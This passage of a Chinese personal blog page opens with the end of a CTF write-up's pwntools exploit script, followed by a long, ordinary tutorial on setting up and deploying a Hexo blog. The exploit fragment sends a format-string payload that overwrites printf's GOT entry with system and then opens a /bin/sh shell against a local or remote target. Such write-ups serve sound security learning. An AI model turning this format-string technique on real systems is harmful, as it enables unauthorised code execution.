class="built_in">hex</span>(<span class="number">0x550000</span> &gt;&gt; <span class="number">8</span> * <span class="number">2</span>))</span><br><span class="line">	rb3 = (sys_addr &amp; <span class="number">0xFF0000</span>) &gt;&gt; (<span class="number">8</span> * <span class="number">2</span>)</span><br><span class="line">	li(<span class="string">&#x27;sys_5: &#x27;</span> + <span class="built_in">hex</span>(rb3))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># modify printf got addr as system</span></span><br><span class="line">	p = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(rb3) + <span class="string">&#x27;c%13$hhn&#x27;</span></span><br><span class="line">	p +=  <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((sys_addr &amp; <span class="number">0xFFFF</span>) - rb3) + <span class="string">&#x27;c%14$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">	p += p64(exe.got[<span class="string">&#x27;printf&#x27;</span>] + <span class="number">2</span>) <span class="comment">#0xFF0000</span></span><br><span class="line">	p += p64(exe.got[<span class="string">&#x27;printf&#x27;</span>] + <span class="number">0</span>) <span class="comment">#0xFFFF</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	s(p)</span><br><span class="line">	sl(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/04/07/wp-easyfmt/" data-id="ckhemv82g002qwdcm2wblhxhl" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-setup-hexo-blog" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/05/setup-hexo-blog/" class="article-date">
  <time datetime="2020-04-05T02:58:39.000Z" itemprop="datePublished">2020-04-05</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/hexo/">hexo</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/05/setup-hexo-blog/">搭建hexo个人博客</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="搭建hexo个人博客"><a href="#搭建hexo个人博客" class="headerlink" title="搭建hexo个人博客"></a>搭建hexo个人博客</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="needs"><a href="#needs" class="headerlink" title="needs"></a>needs</h1><p>git , nodejs, node, hexo, npm</p>
<h2 id="前提准备："><a href="#前提准备：" class="headerlink" title="前提准备："></a>前提准备：</h2><h3 id="linux下搭建hexo环境"><a href="#linux下搭建hexo环境" class="headerlink" title="linux下搭建hexo环境"></a>linux下搭建hexo环境</h3><h3 id="1-node-js安装"><a href="#1-node-js安装" class="headerlink" title="1.node.js安装"></a>1.node.js安装</h3><p>从官网下载linux版本的node.js 或者直接采用wget方式下载<br>官网地址：<a target="_blank" rel="noopener" href="http://nodejs.cn/download/">http://nodejs.cn/download/</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wget下载：wget https://nodejs.org/dist/v10.9.0/node-v10.9.0-linux-x64.tar.xz</span></span><br></pre></td></tr></table></figure>

<h4 id="解压："><a href="#解压：" class="headerlink" title="解压："></a>解压：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar xf node-v10.9.0-linux-x64.tar.xz</span></span><br></pre></td></tr></table></figure>

<h4 id="测试是否正确："><a href="#测试是否正确：" class="headerlink" title="测试是否正确："></a>测试是否正确：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> node-v10.9.0-linux-x64/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./bin/node -v   // 如果出现版本号，说明安装成功</span></span><br></pre></td></tr></table></figure>

<h3 id="移动位置"><a href="#移动位置" class="headerlink" title="移动位置"></a>移动位置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> ..</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mv node-v10.9.0-linux-x64 nodejs <span class="comment"># 修改node-v10.9.0-linux-x64文件夹名字为nodejs</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mv nodejs /usr/share</span></span><br></pre></td></tr></table></figure>

<h4 id="设置软连接"><a href="#设置软连接" class="headerlink" title="设置软连接"></a>设置软连接</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ln -s /usr/share/nodejs/bin/node /usr/<span class="built_in">local</span>/bin/node</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ln -s /usr/share/nodejs/bin/npm /usr/<span class="built_in">local</span>/bin/npm</span></span><br></pre></td></tr></table></figure>

<h4 id="设置npm加速"><a href="#设置npm加速" class="headerlink" title="设置npm加速"></a>设置npm加速</h4><p>创建一个存放博客的文件夹，进入文件夹，右键选择 Git Bash Here，然后设置<code>npm</code>的镜像源为淘宝镜像源，这样能<strong>加快下载插件速度</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org <span class="comment"># 淘宝源</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm config <span class="built_in">set</span> registry https://registry.npmjs.org/ <span class="comment"># 官方源</span></span></span><br></pre></td></tr></table></figure>

<h4 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo npm install hexo-cli -g</span></span><br></pre></td></tr></table></figure>


<p> 把hexo命令添加到全局,方式是采用软连接：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ln -s /usr/share/nodejs/lib/node_modules/hexo-cli/bin/hexo /usr/<span class="built_in">local</span>/bin/hexo</span></span><br></pre></td></tr></table></figure>

<h4 id="部署hexo博客环境"><a href="#部署hexo博客环境" class="headerlink" title="部署hexo博客环境"></a>部署hexo博客环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir blog</span><br><span class="line">cd blog    </span><br><span class="line">hexo init &#x2F;&#x2F;会自动把资源文件下载好</span><br></pre></td></tr></table></figure>

<p>Hexo初始化后 ，有以下几个文件/文件夹。</p>
<ul>
<li><code>scaffolds：</code>生成文章的一些模板 </li>
<li><code>source：</code>用来存放你的文章</li>
<li><code>themes：</code>主题</li>
<li>.<code>gitignore</code> Git忽略文件夹</li>
<li><code>_config.yml:</code> 博客的配置文件</li>
<li><code>package.json</code>  所需模块</li>
<li><code>node_modules:</code> 依赖包</li>
<li><code>package-lock.json</code> 记录了模块下载地址</li>
</ul>
<h3 id="安装依赖插件"><a href="#安装依赖插件" class="headerlink" title="安装依赖插件"></a>安装依赖插件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install </span><br></pre></td></tr></table></figure>

<h3 id="测试运行"><a href="#测试运行" class="headerlink" title="测试运行"></a>测试运行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo generate      <span class="comment">#或者简写hexo g</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> hexo server <span class="comment">#hexo s</span></span></span><br></pre></td></tr></table></figure>

<pre><code>       输入 localhost:4000/
     如果是服务器，我的是阿里云服务器，需要配置安全组打开4000端口，这样就可以在本地访问
     或者linux虚拟机，需要测试内外能否正常通信
     输入ip:4000/ 即可访问hexo的初始页面</code></pre>
<h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span></span><br></pre></td></tr></table></figure>

<p>打开浏览器127.0.0.1:4000，就可以本地预览效果 </p>
<blockquote>
<p>hexo  clean (清除缓存文件,可简写hexo cl)</p>
</blockquote>
<blockquote>
<p>hexo generate (生成网页,可简写hexo g)</p>
</blockquote>
<blockquote>
<p>hexo server (本地预览,可简写hexo s)</p>
</blockquote>
<blockquote>
<p>hexo deploy (部署到GitHub,可简写hexo d)</p>
</blockquote>
<h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><p>打开浏览器127.0.0.1:4000，就可以本地预览效果 </p>
<h2 id="部署到github中"><a href="#部署到github中" class="headerlink" title="部署到github中"></a>部署到github中</h2><p>需要 注意的是，仓库名有要求,要创建一个和你用户名相同的仓库，后面加<code>github.io</code>，只有这样，将来要部署到GitHub page的时候，才会被识别，也就是[<a target="_blank" rel="noopener" href="http://xxxx.github.io,其中xxx就是你注册github的用户名.例如我的github/">http://xxxx.github.io，其中xxx就是你注册gitHub的用户名。例如我的gitHub</a> id为axh2018，那么我的仓库名必须为i0gan.github.io</p>
<h3 id="配置Git账户和邮箱"><a href="#配置Git账户和邮箱" class="headerlink" title="配置Git账户和邮箱"></a>配置Git账户和邮箱</h3><p>在你的博客文件夹下右键Git Bash Here</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.name <span class="string">&quot;I0gan&quot;</span> </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.email <span class="string">&quot;l418894113@gmail.com&quot;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="生成ssh密钥"><a href="#生成ssh密钥" class="headerlink" title="生成ssh密钥"></a>生成ssh密钥</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh-keygen -t rsa -C <span class="string">&quot;l418894113@gmail.com&quot;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="密钥上传到Github"><a href="#密钥上传到Github" class="headerlink" title="密钥上传到Github"></a>密钥上传到Github</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat ~/.ssh/id_rsa.pub</span></span><br></pre></td></tr></table></figure>

<p>登录GitHub网站点右上角<code>Settings-&gt;SSH and GPG Keys</code>,新建一个<code>key</code>,将上面的结果复制填进去就好了</p>
<h3 id="测试是否成功"><a href="#测试是否成功" class="headerlink" title="测试是否成功"></a>测试是否成功</h3><p>下面的指令的输出能看到你<code>Github</code>账户名字就行了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh -T git@github.com</span></span><br></pre></td></tr></table></figure>

<h3 id="克隆项目"><a href="#克隆项目" class="headerlink" title="克隆项目"></a>克隆项目</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> git clone git@github.com:i0gan/hexo_blog.git   .    #克隆项目</span><br><span class="line"><span class="meta">$</span><span class="bash"> npm i                                                <span class="comment">#安装依赖插件和框架</span></span></span><br></pre></td></tr></table></figure>

<p>部署到<code>Github</code>,修改你博客文件夹根目录下的<code>_config.yaml</code>文件的倒数第二行,<code>repository</code>的地址改成你的<code>GitHub</code>博客仓库地址</p>
<p>例如：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">type: git</span><br><span class="line">repository: https://github.com/i0gan/i0gan.github.io</span><br><span class="line">branch: master</span><br></pre></td></tr></table></figure>

<p><strong>到这基本就完成了，剩下你所需要的工作就是把配置文件(根目录下的_config.yaml和主题文件夹下的_config_yaml)的相关信息改为你自己的信息即可。</strong></p>
<h4 id="上传至github中"><a href="#上传至github中" class="headerlink" title="上传至github中"></a>上传至github中</h4><p>此时，大部分工作已经做完了，接下来就是将<code>hexo g</code>生成的静态页面上传到GitHub上</p>
<p>安装deploy-git 插件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>修改_config.yaml文件最后几行</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> <span class="string">https://github.com/i0gan/i0gan.github.io</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean        <span class="comment">#删除原来生成的pubic文件夹</span></span><br><span class="line">$ hexo g            <span class="comment">#生成新的页面</span></span><br><span class="line">$ hexo d            <span class="comment">#部署到GitHub</span></span><br></pre></td></tr></table></figure>

<p>部署成功后可以通过 <a target="_blank" rel="noopener" href="https://i0gan.github.io访问/">https://i0gan.github.io访问</a></p>
<h2 id="创建文章"><a href="#创建文章" class="headerlink" title="创建文章"></a>创建文章</h2><p>新建一篇文章时：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new XXX</span><br></pre></td></tr></table></figure>

<p>它其实默认使用的是<code>post</code>这个布局，也就是在<code>source</code>文件夹下的<code>_post</code>里面。</p>
<p><code>Hexo</code>有三种默认布局：<code>post</code>、<code>page</code>和<code>draft</code>，它们分别对应不同的路径，而您自定义的其他布局和<code>post</code>相同，都将储存到<code>source/_posts</code>文件夹。</p>
<p>而new这个命令其实是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure>

<p>只不过这个<code>layout</code>默认是post</p>
<p>如果你想另起一页，那么可以使用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page newpage</span><br></pre></td></tr></table></figure>

<p>系统会自动给你在<code>source</code>文件夹下创建一个<code>newpage</code>文件夹，以及<code>newpage</code>文件夹中的<code>index.md</code>，这样你访问的<code>newpage</code>对应的链接就是<a target="_blank" rel="noopener" href="http://i0gan.github.io/newpage">http://i0gan.github.io/newpage</a></p>
<p><code>draft</code>是草稿的意思，也就是你如果想写文章，又不希望被看到，那么可以</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new draft newdraft</span><br></pre></td></tr></table></figure>

<p>这样会在<code>source/_draft</code>中新建一个<code>newdraft.md</code>文件，如果你的草稿文件写的过程中，想要预览一下，那么可以使用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server --draft</span><br></pre></td></tr></table></figure>

<p>在本地端口中开启服务预览。</p>
<p>如果你的草稿文件写完了，想要发表到<code>post</code>中，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo publish draft newdraft</span><br></pre></td></tr></table></figure>

<p>就会自动把<code>newdraft.md</code>发送到<code>post</code>中。</p>
<h2 id="跟换主题"><a href="#跟换主题" class="headerlink" title="跟换主题"></a>跟换主题</h2><p>进入博客根目录下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> -b develop https://github.com/blinkfox/hexo-theme-matery themes/matery</span><br></pre></td></tr></table></figure>

<p>此时主题文件夹下会多出一个matery主题。</p>
<p>然后再更改根目录下的_config.yml配置文件。找到<code>themes:</code>，将他的值改为<code>matery</code>。</p>
<p>此时你可以<code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</code></p>
<p>本地预览<code>matery</code>主题的效果</p>
<p>关于<code>matery</code>主题：</p>
<p>特性：</p>
<ul>
<li>简单漂亮，文章内容美观易读</li>
<li><a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cHM6Ly9tYXRlcmlhbC5pby8=">Material Design</a> 设计</li>
<li>响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现</li>
<li>首页轮播文章及每天动态切换 <code>Banner</code> 图片</li>
<li>瀑布流式的博客文章列表（文章无特色图片时会有 <code>24</code> 张漂亮的图片代替）</li>
<li>时间轴式的归档页</li>
<li><strong>词云</strong>的标签页和<strong>雷达图</strong>的分类页</li>
<li>丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）</li>
<li>可自定义的数据的友情链接页面</li>
<li>支持文章置顶和文章打赏</li>
<li>支持 <code>MathJax</code></li>
<li><code>TOC</code> 目录</li>
<li>可设置复制文章内容时追加版权信息</li>
<li>可设置阅读文章时做密码验证</li>
<li><a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cHM6Ly9naXRhbGsuZ2l0aHViLmlvLw==">Gitalk</a>、<a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cHM6Ly9pbXN1bi5naXRodWIuaW8vZ2l0bWVudC8=">Gitment</a>、<a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cHM6Ly92YWxpbmUuanMub3JnLw==">Valine</a> 和 <a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cHM6Ly9kaXNxdXMuY29tLw==">Disqus</a> 评论模块（推荐使用 <code>Gitalk</code>）</li>
<li>集成了<a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cDovL2J1c3VhbnppLmlicnVjZS5pbmZvLw==">不蒜子统计</a>、谷歌分析（<code>Google Analytics</code>）和文章字数统计等功能</li>
<li>支持在首页的音乐播放和视频播放功能</li>
<li>支持<code>emoji</code>表情，用<code>markdown emoji</code>语法书写直接生成对应的能<strong>跳跃</strong>的表情。</li>
<li>支持 <a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cDovL3d3dy5kYW92b2ljZS5pby8=">DaoVoice</a>、<a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cHM6Ly93d3cudGlkaW8uY29tLw==">Tidio</a> 在线聊天功能。</li>
</ul>
<h2 id="Laylout"><a href="#Laylout" class="headerlink" title="Laylout"></a>Laylout</h2><h3 id="新建分类categories"><a href="#新建分类categories" class="headerlink" title="新建分类categories"></a>新建分类categories</h3><p><code>categories</code> 页是用来展示所有分类的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>categories/index.md</code> 文件，那么你就需要新建一个，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page <span class="string">&quot;categories&quot;</span></span><br></pre></td></tr></table></figure>

<p>编辑你刚刚新建的页面文件 <code>/source/categories/index.md</code>，至少需要以下内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: categories</span><br><span class="line">date: 2018-09-30 17:25:30</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">layout: &quot;categories&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<h3 id="新建标签-tags-页"><a href="#新建标签-tags-页" class="headerlink" title="新建标签 tags 页"></a>新建标签 tags 页</h3><p><code>tags</code> 页是用来展示所有标签的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>tags/index.md</code> 文件，那么你就需要新建一个，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page <span class="string">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure>

<p>编辑你刚刚新建的页面文件 <code>/source/tags/index.md</code>，至少需要以下内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line">date: 2020-04-04 18:23:38</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">layout: &quot;tags&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<h3 id="新建about关于我页"><a href="#新建about关于我页" class="headerlink" title="新建about关于我页"></a>新建about关于我页</h3><p><code>about</code> 页是用来展示<strong>关于我和我的博客</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>about/index.md</code> 文件，那么你就需要新建一个，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page <span class="string">&quot;about&quot;</span></span><br></pre></td></tr></table></figure>

<p>编辑你刚刚新建的页面文件 <code>/source/about/index.md</code>，至少需要以下内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: about</span><br><span class="line">date: 2020-04-04 18:23:38</span><br><span class="line">type: &quot;about&quot;</span><br><span class="line">layout: &quot;about&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<h3 id="新建留言板contact页"><a href="#新建留言板contact页" class="headerlink" title="新建留言板contact页"></a>新建留言板contact页</h3><p><code>contact</code> 页是用来展示<strong>留言板</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>contact/index.md</code> 文件，那么你就需要新建一个，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page <span class="string">&quot;contact&quot;</span></span><br></pre></td></tr></table></figure>

<p>编辑你刚刚新建的页面文件 <code>/source/contact/index.md</code>，至少需要以下内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: contact</span><br><span class="line">date: 2020-04-04 18:23:38</span><br><span class="line">type: &quot;contact&quot;</span><br><span class="line">layout: &quot;contact&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注</strong>：本留言板功能依赖于第三方评论系统，请<strong>激活</strong>你的评论系统才有效果。并且在主题的 <code>_config.yml</code> 文件中，第 <code>19</code> 至 <code>21</code> 行的“<strong>菜单</strong>”配置，取消关于留言板的注释即可</p>
</blockquote>
<h3 id="新建友情链接friends页"><a href="#新建友情链接friends页" class="headerlink" title="新建友情链接friends页"></a>新建友情链接friends页</h3><p><code>friends</code> 页是用来展示<strong>友情连接</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>friends/index.md</code> 文件，那么你就需要新建一个，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page <span class="string">&quot;friends&quot;</span></span><br></pre></td></tr></table></figure>

<p>编辑你刚刚新建的页面文件 <code>/source/friends/index.md</code>，至少需要以下内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: friends</span><br><span class="line">date: 2020-04-04 18:23:38</span><br><span class="line">type: &quot;friends&quot;</span><br><span class="line">layout: &quot;friends&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p>同时，在你的博客 <code>source</code> 目录下新建 <code>_data</code> 目录，在 <code>_data</code> 目录中新建 <code>friends.json</code> 文件，文件内容如下所示：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[&#123;</span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span>: <span class="string">&quot;http://image.luokangyuan.com/1_qq_27922023.jpg&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;1FONLY&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;introduction&quot;</span>: <span class="string">&quot;我不是大佬，只是在追寻大佬的脚步&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;https://hack-for.fun&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;查看大佬&quot;</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span>: <span class="string">&quot;http://image.luokangyuan.com/4027734.jpeg&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;V1cuna&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;introduction&quot;</span>: <span class="string">&quot;编程界大佬，技术牛，人还特别好，不懂的都可以请教大佬&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;http://hackyangtuo.top/&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;查看大佬&quot;</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span>: <span class="string">&quot;http://image.luokangyuan.com/avatar.jpg&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;cT_Hc&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;introduction&quot;</span>: <span class="string">&quot;平凡的脚步也可以走出伟大的行程&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;https://blog.csdn.net/qq_35289660&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;查看大佬&quot;</span></span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure>

<h3 id="菜单导航配置"><a href="#菜单导航配置" class="headerlink" title="菜单导航配置"></a>菜单导航配置</h3><ul>
<li>配置基本菜单导航的名称、路径url和图标icon.</li>
</ul>
<p>菜单导航名称可以是中文也可以是英文(如：<code>Index</code>或<code>主页</code>) 2.图标icon 可以在[Font Awesome] 中查找</p>
